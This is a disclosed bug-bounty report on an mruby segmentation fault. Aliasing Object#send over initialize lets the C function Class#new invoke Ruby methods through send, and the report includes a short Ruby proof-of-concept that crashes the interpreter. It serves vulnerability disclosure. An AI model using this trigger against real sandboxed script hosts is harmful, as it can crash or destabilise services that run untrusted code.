# Segmentation fault when a Ruby method is invoked by a C method via Object#send

## Report Details
- **Report ID**: 183425
- **URL**: https://hackerone.com/reports/183425
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-11-19T06:44:22.273Z
- **Disclosed**: 2017-04-13T21:07:57.292Z

## Reporter
- **Username**: h72
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
We can arrange for C to call `Object#send` by aliasing it over `initialize`. This will cause `Class#new` (a C function) to call `#initialize` (which is actually `Object#send`) with arbitrary arguments.

If we invoke a Ruby method through `Object#send`, mruby segfaults:

```
def foo
end

class X
  alias_method :initialize, :send
end

X.new.send(:foo)
```

## Attachments
No attachments
